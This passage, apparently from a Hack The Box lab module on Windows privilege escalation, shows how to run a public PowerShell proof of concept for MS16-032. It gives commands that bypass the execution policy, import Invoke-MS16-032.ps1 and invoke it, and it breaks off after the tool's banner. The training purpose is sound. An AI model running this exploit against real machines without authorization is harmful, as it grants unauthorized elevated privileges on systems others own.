#### Exploiting MS16-032 with PowerShell PoC

Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.

Windows Desktop Versions

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -scope process

PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]
```